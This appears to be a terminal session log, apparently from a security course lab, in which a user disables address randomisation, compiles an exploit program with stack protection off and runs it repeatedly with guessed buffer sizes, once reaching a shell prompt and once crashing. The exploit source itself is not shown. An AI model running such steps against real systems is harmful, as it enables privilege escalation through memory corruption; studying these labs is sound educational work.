@@ -1,0 +1,69 @@
+Script started on Mon 02 Apr 2018 01:55:39 PM EDT
+]0;kkimbel@js-156-147: ~kkimbel@js-156-147:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+]0;kkimbel@js-156-147: ~kkimbel@js-156-147:~$ gcc -fno-stack-protector -z execstack /home/kkimbel/Deskto p/attack.c -0[Ko at[K[K/home/kkimbel/Desktop/attack.c[K[K
+/home/kkimbel/Desktop/attack.c: In function ‘main’:
+/home/kkimbel/Desktop/attack.c:20:7: warning: incompatible implicit declaration of built-in function ‘exit’ [enabled by default]
+       exit(0);
+       ^
+/home/kkimbel/Desktop/attack.c:24:14: warning: incompatible implicit declaration of built-in function ‘malloc’ [enabled by default]
+       buff = malloc(bsize);
+              ^
+/home/kkimbel/Desktop/attack.c:26:12: warning: assignment makes pointer from integer without a cast [enabled by default]
+       addr = get_sp() -offset;
+            ^
+/home/kkimbel/Desktop/attack.c:27:7: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long int *’ [-Wformat=]
+       printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+       ^
+/home/kkimbel/Desktop/attack.c:33:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+       *(addr_ptr)=addr;
+                  ^
+/home/kkimbel/Desktop/attack.c:38:23: warning: assignment makes integer from pointer without a cast [enabled by default]
+       buff[bsize - 1] = (char*)NULL; 
+                       ^
+]0;kkimbel@js-156-147: ~kkimbel@js-156-147:~$ cd /home/kkimbel/Desktop/attack.c[K[K[K[K[K[K[K[K
+]0;kkimbel@js-156-147: ~/Desktopkkimbel@js-156-147:~/Desktop$ ls
+[0m[01;32mattack[0m                      [01;34mFinished[0m          screen.log
+[01;32mattack.c[0m                    [01;32mNotes:[0m            [01;34mUpdated Submission[0m
+[01;32mBufferRedirectViaStack64.c[0m  [01;34mPart3[0m
+[01;32mchangeres.desktop[0m           [01;34mPlanning Teplate[0m
+]0;kkimbel@js-156-147: ~/Desktopkkimbel@js-156-147:~/Desktop$ /[K./attack 1024 12000 140737488348496
+Using address as guess for beginning of attack buffer: 0xffffb670
+
+Length of Input String:1022
+
+
+Value of Test:ffffba88
+Value of filename[0]:ffffb680
+
+You are going to need a buffer a little larger than:1032
+
+Using address as guess for beginning of attack buffer: 0xffffdac1
+
+]0;kkimbel@js-156-147:~/Desktop$ ./attack 1056 12000
+140737488348496
+Using address as guess for beginning of attack buffer: 0xffffb670
+
+Length of Input String:1054
+
+
+Value of Test:ffffba68
+Value of filename[0]:ffffb660
+
+You are going to need a buffer a little larger than:1032
+
+# exit
+]0;kkimbel@js-156-147:~/Desktop$ ./attack 1064 12000
+140737488348496
+Using address as guess for beginning of attack buffer: 0xffffb670
+
+Length of Input String:1062
+
+
+Value of Test:ffffba58
+Value of filename[0]:ffffb650
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;kkimbel@js-156-147 exit
+Script done on Mon 02 Apr 2018 02:00:19 PM EDT
